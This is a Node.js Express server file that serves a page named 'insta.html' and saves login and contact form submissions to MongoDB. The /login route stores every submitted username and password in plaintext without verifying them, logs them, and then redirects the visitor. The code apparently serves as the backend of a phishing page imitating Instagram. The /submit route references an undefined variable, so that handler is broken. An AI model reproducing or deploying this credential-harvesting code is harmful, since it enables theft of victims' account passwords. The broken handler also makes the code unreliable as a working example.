const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');

const port = process.env.PORT || 3001;
const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB connection
const mongoUri = 'mongodb://localhost:27017/vac';
mongoose
  .connect(mongoUri, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log('Connected to MongoDB'))
  .catch((err) => console.error('MongoDB connection error:', err));

// Schema for Login Details
const loginSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
});

const LoginData = mongoose.model('LoginData', loginSchema);

// Schema for Form Data
const formSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true },
  phone: { type: String, required: true },
});

const FormData = mongoose.model('FormData', formSchema);

// Routes

// Serve the Home Page (insta.html)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'insta.html'));
});
app.get('/home', (req, res) => {
    res.sendFile(path.join(__dirname, 'home.html'));
  });

app.get('/form', (req,res) => {
    res.sendFile(path.join(__dirname,'form.html'))
})


// Handle Login Form Submission
app.post('/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).send('Username and password are required.');
    }

    const loginData = new LoginData(req.body);
    await loginData.save();
    console.log('Login data saved:', loginData);

    // Redirect to index.html after successful login
    res.redirect('/home.html');
  } catch (error) {
    console.error('Error saving login data:', error);
    res.status(500).send('An error occurred while saving login data.');
  }
});

// Handle Form Submission
app.post('/submit', async (req, res) => {
  try {
    const { name, email, phone } = req.body;
    console.log(req.body)
    if (!name || !password) {
      return res.status(400).send('All fields are required.');
    }

    const formData = new FormData(req.body);
    await formData.save();
    console.log('Form data saved:', formData);

    // Redirect to index.html after successful form submission
    res.redirect('/home.html');
  } catch (error) {
    console.error('Error saving form data:', error);
    res.status(500).send('An error occurred while saving form data.');
  }
});

// Start Server
app.listen(port, () => {
  console.log(`Server started on http://localhost:${port}`);
});
